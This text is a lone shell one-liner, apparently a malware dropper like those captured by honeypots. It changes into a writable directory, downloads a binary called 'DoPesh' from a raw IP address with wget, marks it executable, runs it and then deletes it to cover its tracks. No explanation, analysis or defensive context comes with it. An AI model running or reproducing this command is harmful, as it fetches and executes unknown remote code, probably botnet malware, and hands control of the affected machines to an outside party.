cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.82.67.192/DoPesh; chmod +x DoPesh; ./DoPesh; rm -rf DoPesh
